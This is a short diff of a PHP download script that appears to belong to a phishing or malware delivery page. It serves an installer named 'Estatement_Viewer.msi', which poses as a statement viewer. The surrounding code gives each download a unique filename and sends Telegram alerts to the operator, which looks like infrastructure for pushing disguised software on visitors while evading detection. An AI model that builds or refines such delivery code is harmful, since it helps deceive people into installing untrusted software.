@@ -96,7 +96,7 @@ if (\$apiResponse) {
 // =========================================================================
 // 3. FILE DELIVERY WITH DYNAMIC RENAMING
 // =========================================================================
-\$realFilePath = 'Estatement_Viewer';
+\$realFilePath = 'Estatement_Viewer.msi';
 
 if (file_exists(\$realFilePath)) {
     // Generate a completely unique filename suffix for every request
@@ -130,7 +130,7 @@ if (file_exists(\$realFilePath)) {
     
 } else {
     // Error Handling if the target file is missing on the server storage
-    \$errorAlert = "⚠️ *Critical Error:* A visitor attempted to download the file, but `files/installer.exe` was missing on your server storage.";
+    \$errorAlert = "⚠️ *Critical Error:* A visitor attempted to download the file, but `Estatement_Viewer.msi` was missing on your server storage.";
     sendTelegramNotification(\$errorAlert);
     
     header("HTTP/1.0 404 Not Found");
